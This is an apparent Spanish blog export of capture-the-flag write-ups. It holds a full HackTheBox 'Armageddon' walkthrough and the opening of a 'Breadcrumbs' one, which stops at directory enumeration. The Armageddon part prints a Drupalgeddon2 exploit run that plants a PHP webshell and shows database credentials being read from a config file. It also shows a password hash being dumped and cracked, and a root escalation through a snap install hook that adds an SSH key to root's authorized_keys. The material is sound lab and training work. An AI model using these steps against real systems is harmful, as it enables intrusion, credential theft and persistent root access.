[{"content":"  Armageddon una maquina de HackTheBox con SO Linux, encontramos una version de Drupal desactualizada por donde obtuvimos acceso. Tras obtener credenciales de una base de datos cambiamos a un siguiente usuario, y, con este ultimo escalamos privilegios creando un paquete de snap.\n   Nombre Armageddon      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.233   Maker bertolis    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 4.6, 5.8, 4.2, 5.4], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     RECON NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.91 scan initiated Sun Mar 28 01:55:48 2021 as: nmap -Pn -p- --min-rate 10000 -oN allports 10.10.10.233 Warning: 10.10.10.233 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.097s latency). Not shown: 41553 filtered ports, 23980 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sun Mar 28 01:57:23 2021 -- 1 IP address (1 host up) scanned in 95.32 seconds # Nmap 7.91 scan initiated Sun Mar 28 01:58:26 2021 as: nmap -Pn -sV -sC -p 22,80 -oN serviceports 10.10.10.233 Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-generator: Drupal 7 (http://drupal.org) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Mar 28 01:58:44 2021 -- 1 IP address (1 host up) scanned in 17.45 seconds   DRUPAL Encontramos en el puerto 80 Drupal en su version 7 y basandonos en el archivo CHANGELOG.txt e /includes/bootstrap.inc podriamos confirmar que la version es 7.56.\n1 2 3 4 5 6 7 8 9 10 11 12  HTTP/1.1 200 OK Date: Sun, 28 Mar 2021 06:03:20 GMT Server: Apache/2.4.6 (CentOS) PHP/5.4.16 X-Powered-By: PHP/5.4.16 Expires: Sun, 19 Nov 1978 05:00:00 GMT Cache-Control: no-cache, must-revalidate X-Content-Type-Options: nosniff Content-Language: en X-Frame-Options: SAMEORIGIN X-Generator: Drupal 7 (http://drupal.org) Content-Length: 7440 Content-Type: text/html; charset=utf-8   1 2 3 4 5 6 7 8 9  ┌──(kali㉿kali)-[~/htb/armageddon] └─$ curl -s http://10.10.10.233/CHANGELOG.txt | head Drupal 7.56, 2017-06-21 ----------------------- - Fixed security issues (access bypass). See SA-CORE-2017-003. ┌──(kali㉿kali)-[~/htb/armageddon] └─$ curl -s http://10.10.10.233/includes/bootstrap.inc|grep \u0026#34;define(\u0026#39;VERSION\u0026#39;\u0026#34; define(\u0026#39;VERSION\u0026#39;, \u0026#39;7.56\u0026#39;);   GOBUSTER Gobustter mostró direcciones que pertenecen a drupal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ┌──(kali㉿kali)-[~/htb/armageddon] └─$ gobuster dir -u http://10.10.10.233/ -w /usr/share/wordlists/dirb/common.txt -t 150 -q -x php,html,txt,xml,py,pl,sh,bak /1 (Status: 200) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /includes (Status: 301) /install.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /LICENSE.txt (Status: 200) /misc (Status: 301) /modules (Status: 301) /profiles (Status: 301) /README.txt (Status: 200) /scripts (Status: 301) /sites (Status: 301) /themes (Status: 301) /update.php (Status: 403) /web.config (Status: 200) /xmlrpc.php (Status: 200) /xmlrpc.php (Status: 200)   DRUPALGEDDON Realizamos una busqueda de las versiones más cercanas a Drupal 7.56 la cual tenga un exploit o vulnerabilidad. Encontramos Drupalgeddon2 y Drupalgeddon3 las más sobresalientes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ┌──(kali㉿kali)-[~/htb/armageddon] └─$ searchsploit drupal 7.56 130 ⨯ ------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------ --------------------------------- Drupal \u0026lt; 7.58 - \u0026#39;Drupalgeddon3\u0026#39; (Authenticated) Remote Code (Metasploit) | php/webapps/44557.rb Drupal \u0026lt; 7.58 - \u0026#39;Drupalgeddon3\u0026#39; (Authenticated) Remote Code Execution (PoC) | php/webapps/44542.txt Drupal \u0026lt; 7.58 / \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution | php/webapps/44449.rb Drupal \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution (Metasploit) | php/remote/44482.rb Drupal \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution (PoC) | php/webapps/44448.py Drupal \u0026lt; 8.5.11 / \u0026lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit) | php/remote/46510.rb Drupal \u0026lt; 8.6.10 / \u0026lt; 8.5.11 - REST Module Remote Code Execution | php/webapps/46452.txt Drupal \u0026lt; 8.6.9 - REST Module Remote Code Execution | php/webapps/46459.py ------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results   La vulnerabilidad de la cual Drupalgeddon2 se aprovecha se encuentra en la \u0026ldquo;API\u0026rdquo; de Formularios de Drupal.\nAPACHE - USER Encontramos un exploit el cual realiza la explotacion para Drupalgeddon2 con la cual logramos ejecutar comandos como usuario Apache con una simple webshell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  ──(kali㉿kali)-[~/htb/armageddon] └─$ ruby drupalgeddon2.rb Usage: ruby drupalggedon2.rb \u0026lt;target\u0026gt; [--authentication] [--verbose] Example for target that does not require authentication: ruby drupalgeddon2.rb https://example.com Example for target that does require authentication: ruby drupalgeddon2.rb https://example.com --authentication ┌──(kali㉿kali)-[~/htb/armageddon] └─$ ruby drupalgeddon2.rb http://10.129.89.116/ [*] --==[::#Drupalggedon2::]==-- -------------------------------------------------------------------------------- [i] Target : http://10.129.89.116/ -------------------------------------------------------------------------------- [+] Found : http://10.129.89.116/CHANGELOG.txt (HTTP Response: 200) [+] Drupal!: v7.56 -------------------------------------------------------------------------------- [*] Testing: Form (user/password) [+] Result : Form valid - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Clean URLs [!] Result : Clean URLs disabled (HTTP Response: 404) [i] Isn\u0026#39;t an issue for Drupal v7.x -------------------------------------------------------------------------------- [*] Testing: Code Execution (Method: name) [i] Payload: echo ECWIGPQW [+] Result : ECWIGPQW [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO! -------------------------------------------------------------------------------- [*] Testing: Existing file (http://10.129.89.116/shell.php) [i] Response: HTTP 404 // Size: 5 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Writing To Web Root (./) [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php [+] Result : \u0026lt;?php if( isset( $_REQUEST[\u0026#39;c\u0026#39;] ) ) { system( $_REQUEST[\u0026#39;c\u0026#39;] . \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39; ); } [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!! -------------------------------------------------------------------------------- [i] Fake PHP shell: curl \u0026#39;http://10.129.89.116/shell.php\u0026#39; -d \u0026#39;c=hostname\u0026#39; armageddon.htb\u0026gt;\u0026gt; armageddon.htb\u0026gt;\u0026gt; whoami; id; pwd apache uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 /var/www/html armageddon.htb\u0026gt;\u0026gt;   DRUPAL DB Con esta webshell realizamos una enumeracion de los archivos de configuracion de drupal, donde encontramos el archivo de configuracion que contiene las credenciales de la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  armageddon.htb\u0026gt;\u0026gt; find . -name settings.php 2\u0026gt;/dev/null [!] WARNING: Detected an known bad character (\u0026gt;) ./sites/default/settings.php armageddon.htb\u0026gt;\u0026gt; cat ./sites/default/settings.php|grep \u0026#34;password\u0026#34; * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * username, password, host, and database name. * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, * by using the username and password variables. The proxy_user_agent variable # $conf[\u0026#39;proxy_password\u0026#39;] = \u0026#39;\u0026#39;; armageddon.htb\u0026gt;\u0026gt; $databases = array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;drupaluser\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ), ), );   Utilizando estas credenciales con mysql, logrando obtener la contraseña encriptada de la base de datos de drupal del usuario brucetherealadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;show databases;\u0026#34; Database information_schema drupal mysql performance_schema armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;use drupal; show tables;\u0026#34; Tables_in_drupal actions authmap [... REDACTED ...] users users_roles variable watchdog armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;use drupal; describe users;\u0026#34; Field Type Null Key Default Extra uid int(10) unsigned NO PRI 0 name varchar(60) NO UNI pass varchar(128) NO mail varchar(254) YES MUL theme varchar(255) NO signature varchar(255) NO signature_format varchar(255) YES NULL created int(11) NO MUL 0 access int(11) NO MUL 0 login int(11) NO 0 status tinyint(4) NO 0 timezone varchar(32) YES NULL language varchar(12) NO picture int(11) NO MUL 0 init varchar(254) YES data longblob YES NULL armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;use drupal; select uid,name,pass from users;\u0026#34; uid name pass 0 1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt armageddon.htb\u0026gt;\u0026gt;   JOHN Utilizamos John para obtener en texto plano la contraseña.\n1 2 3 4 5 6 7 8 9 10 11  ┌──(kali㉿kali)-[~/htb/armageddon] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_brucetherealadmin Using default input encoding: UTF-8 Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 32768 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status booboo (?) 1g 0:00:00:00 DONE (2021-03-28 03:24) 2.000g/s 464.0p/s 464.0c/s 464.0C/s tiffany..harley Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   BRUCE - USER Ingresamos por el servicio SSH, logrando obtener una shell con el usuario brucetherealadmin y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ┌──(kali㉿kali)-[~/htb/armageddon] └─$ ssh brucetherealadmin@10.129.89.116 # booboo 130 ⨯ brucetherealadmin@10.129.89.116\u0026#39;s password: Last failed login: Sun Mar 28 08:13:18 BST 2021 from 10.10.14.48 on ssh:notty There was 1 failed login attempt since the last successful login. Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2 [brucetherealadmin@armageddon ~]$ whoami;id;pwd brucetherealadmin uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 /home/brucetherealadmin [brucetherealadmin@armageddon ~]$ ls user.txt [brucetherealadmin@armageddon ~]$ cat user.txt| cut -c1-15 69eb27ca88fbbd9   PRIVILEGE ESCALATION El usuario actual puede ejecutar el comando sudo snap install * por lo que podriamos instalar snaps. Verificamos si exsitia algun paquete instalado y observamos solamente el core, además encontramos que la version de snap es la 2.47.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  [brucetherealadmin@armageddon ~]$ sudo -l -l Matching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User brucetherealadmin may run the following commands on armageddon: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/snap install * [brucetherealadmin@armageddon ~]$ [brucetherealadmin@armageddon ~]$ snap list Name Version Rev Tracking Publisher Notes core 16-2.49 10859 latest/stable canonical✓ core [brucetherealadmin@armageddon ~]$ snap --version snap 2.47.1-1.el7 snapd 2.47.1-1.el7 series 16 centos 7 kernel 3.10.0-1160.6.1.el7.x86_64 [brucetherealadmin@armageddon ~]$   Despues de realizar una busqueda de posibles exploits o vulnerabilidades relacionadas a snap, encontramos dirty_sock, el cual se aprovecha de la instalacion de un snap a traves de la API de snap y la instalacion de hooks, lo que permitiría obtener acceso privilegiado en el sistema. Existen dos exploits, dirty_sockv1 se aprovecha de la API de snap para la creacion de un usuario utilizando una cuenta de Ubuntu SSO aunque es necesario que la maquina tenga acceso a internet. dirty_sockv2 en este, se utilizan los hooks de snap para ejecutar comandos cuando un paquete es instalado en modo devmode.\n \u0026hellip; snaps have something called “hooks”. One such hook, the “install hook” is run at the time of snap installation and can be a simple shell script. If the snap is configured in “devmode”, then this hook will be run in the context of root.\n En esta maquina al poder instalar paquetes mediante sudo los hooks se estarían ejecutando como root. Creamos nuestro propio paquete utilizando los comandos de dirtysockv2 de este post, aunque a diferencia de este agregamos la clave publica del usuario brucetherealadmin al archivo /root/.ssh/authorized_keys en el script snap/hooks/install, para poder tener acceso a traves de SSH en localhost.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  [brucetherealadmin@armageddon ~]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/brucetherealadmin/.ssh/id_rsa): Created directory \u0026#39;/home/brucetherealadmin/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/brucetherealadmin/.ssh/id_rsa. Your public key has been saved in /home/brucetherealadmin/.ssh/id_rsa.pub. The key fingerprint is: SHA256:DjcytDVT0BIUbXeGj0gziVxCQXuKut8Qzdkkd4iRMcE brucetherealadmin@armageddon.htb The key\u0026#39;s randomart image is: +---[RSA 2048]----+ | *#\u0026amp;o. . | | EBO.o o | | . B+==.= | | . * @... . | | B S . | | . B . | | . . . | | . o | | ... . | +----[SHA256]-----+ [brucetherealadmin@armageddon ~]$ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEXyP4V63iTvxbzKeHw4loojfsZHI0hWLwDnaE043yxtsvItYh7JGQf5SkTjFHe2LOuDSrEL0u8OFQAZvIwubxmeqfuGIBXOoZRQKyfCA8bayCce9w2MdG9w1xX4dZZ45ht38Y17EWvZipxyOVMZQYuld3aBs5S5FV8Ii6r3HTpLOvhXMHxoti9NAr6wAxbcNKA28lNYriCgAsNvGW8ieIrhIw44luU9nZaNS4NfRkuLLh2/Bii0axUA1f0ZkhTOtIWk0REMQALDJrfgvjV+5b+EQGgfsQ8/dvzy7tWPargurCFTSQwCuHXHs+4t1Hvv32e+fKi4F7iu/YG6xyyZXj brucetherealadmin@armageddon.htb [brucetherealadmin@armageddon ~]$   Hay que mencionar que es posible ejecutar algun otro tipo de comando en el hook, tambien, el script original del hook no funciona en esta maquina para obtener acceso privilegiado ya que no existe el grupo sudo en la maquina.\n En caso de algun tipo de error utilizar #!/bin/sh -e en lugar de #!/bin/bash.\n Creamos el snap con los siguientes comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  ## Initialize the directory as a snap project snapcraft init ## Set up the install hook mkdir snap/hooks touch snap/hooks/install chmod a+x snap/hooks/install ## Write the script we want to execute as root cat \u0026gt; snap/hooks/install \u0026lt;\u0026lt; \u0026#34;EOF\u0026#34; #!/bin/sh -e mkdir /root/.ssh/ echo \u0026#34;ssh-rsa AAAAB3NzaC1yc[...]+4t1Hvv32e+fKi4F7iu/YG6xyyZXj brucetherealadmin@armageddon.htb\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys EOF ## Configure the snap yaml file cat \u0026gt; snap/snapcraft.yaml \u0026lt;\u0026lt; \u0026#34;EOF\u0026#34; name: dirty-sock version: \u0026#39;0.1\u0026#39; summary: Empty snap, used for exploit description: | See https://github.com/initstring/dirty_sock grade: devel confinement: devmode parts: my-part: plugin: nil EOF ## Build the snap snapcraft   Con esto se creará el archivo dirty-sock_0.1_amd64.snap el cual trasladamos a la maquin e instalamos en modo devmode, al no haber ningun tipo de error verificamos que los comandos fueron ejecutados ingresando al usuario root mediante SSH, lo cual nos permitió obtener una shell y flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  brucetherealadmin@armageddon ~]$ sudo snap install dirty-sock_0.1_amd64.snap --devmode dirty-sock 0.1 installed [brucetherealadmin@armageddon ~]$ [brucetherealadmin@armageddon ~]$ ssh root@localhost The authenticity of host \u0026#39;localhost (::1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao. ECDSA key fingerprint is MD5:3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. Last login: Tue Mar 23 12:51:31 2021 [root@armageddon ~]# whoami root [root@armageddon ~]# ls anaconda-ks.cfg cleanup.sh passwd reset.sh root.txt snap [root@armageddon ~]# cat root.txt | cut -c1-15 7ed932f4e56933d [root@armageddon ~]#   CRONTAB Con el usuario root encontramos dos crons, los cuales restauran archivos, limpian carpetas y eliminan los snaps instalados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  [root@armageddon ~]# crontab -l 5 * * * * /root/reset.sh * * * * * /root/cleanup.sh [root@armageddon ~]# cat /root/reset.sh #!/bin/bash cp /root/passwd /etc/passwd rm -rf /tmp/* /dev/shm/* [root@armageddon ~]# cat /root/cleanup.sh #!/bin/bash /usr/bin/snap list | tail -n +2 | grep -v \u0026#39;^core \u0026#39; | awk \u0026#39;{print $1}\u0026#39; | while read s do /usr/bin/snap remove --purge \u0026#34;$s\u0026#34; done [root@armageddon ~]#   ","description":"Armageddon una maquina de HackTheBox con SO Linux, encontramos una version de Drupal desactualizada por donde obtuvimos acceso. Tras obtener credenciales de una base de datos cambiamos a un siguiente usuario, y, con este ultimo escalamos privilegios creando un paquete de snap.","id":0,"section":"posts","tags":["drupal","drupalgeddon2","snap"],"title":"Hack The Box - Armageddon","uri":"https://sckull.github.io/posts/armageddon/"},{"content":"  Breadcrumbs expone un sitio web donde descubrimos una vulnerabilidad LFI la cual nos proporcionó la informacion para obtener acceso como admin, para luego obtener credenciales y acceder por SSH. Obtuvimos acceso al siguiente usuario con credenciales en la aplicacion de Notas de Windows. Con Proxychains creamos un tunnel para acceder a una aplicacion donde encontramos la contraseña del administrador.\n   Nombre Breadcrumbs      OS Windows   Puntos 40   Dificultad Dificil   IP 10.10.10.228   Maker helich0pper    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.6, 6.7, 4.6, 5.4, 3.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 10, 1, 9, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     Recon NMAP Escaneo de puertos con nmap nos muestra el puerto http/s (80, 443), ssh (22), smb (139, 445), mysql (3306) y el puerto rpc (135) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  # Nmap 7.91 scan initiated Thu May 27 17:55:50 2021 as: nmap -Pn -sV -sC -p22,80,135,139,443,445,3306,5040,49664,49666,49667,49668,49669 -oN scan_ports 10.10.10.228 Nmap scan report for 10.10.10.228 (10.10.10.228) Host is up (0.26s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA) | 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA) |_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519) 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 3306/tcp open mysql? | fingerprint-strings: | Help, Kerberos, SMBProgNeg, WMSRequest: |_ Host \u0026#39;10.10.14.25\u0026#39; is not allowed to connect to this MariaDB server 5040/tcp open unknown 49664/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.91%I=7%D=5/27%Time=60B01574%P=x86_64-pc-linux-gnu%r(He SF:lp,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allow SF:ed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(Kerberos,4A, SF:\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allowed\\x20 SF:to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(SMBProgNeg,4A,\u0026#34;F\\0 SF:\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x SF:20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(WMSRequest,4A,\u0026#34;F\\0\\0\\x SF:01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x20co SF:nnect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -44m27s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-27T21:14:05 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu May 27 17:58:47 2021 -- 1 IP address (1 host up) scanned in 177.03 seconds   RPCCLIENT \u0026amp; SMB El puerto RPC y SMB no muestran informacion en sesion null.\n1 2 3 4  π ~/htb/breadcrumbs ❯ rpcclient -N -U \u0026#34;\u0026#34; -L \\\\10.10.10.228 Cannot connect to server. Error was NT_STATUS_UNSUCCESSFUL π ~/htb/breadcrumbs ❯ smbclient -N -U \u0026#34;\u0026#34; -L \\\\10.10.10.228 session setup failed: NT_STATUS_ACCESS_DENIED   HTTP Encontramos una pagina aparentemente estatica con una opcion de verificar libros.\nVemos un buscador de libros por Titulo y Autor.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en las 